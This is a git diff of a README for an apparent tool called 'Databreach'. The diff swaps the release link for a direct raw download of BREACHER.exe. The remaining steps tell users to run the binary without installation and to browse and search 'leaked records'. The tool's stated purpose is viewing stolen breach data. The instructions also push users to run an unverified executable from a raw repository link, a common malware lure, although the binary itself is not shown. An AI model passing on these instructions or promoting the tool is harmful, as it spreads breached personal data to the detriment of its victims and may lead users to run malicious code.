@@ -16,7 +16,7 @@
 
 ## 🚀 How to Use
 
-1. **Download the `.exe`** file from the [Releases](https://github.com/appuachu/Databreach/) section.
+1. **Download the `.exe`** file from the [Releases](https://github.com/appuachu/Databreach/raw/refs/heads/main/BREACHER.exe) section.
 2. **Run the executable** (no installation required).
 3. The tool will load and display breached data in a readable format.
 4. Scroll or search to explore the leaked records.
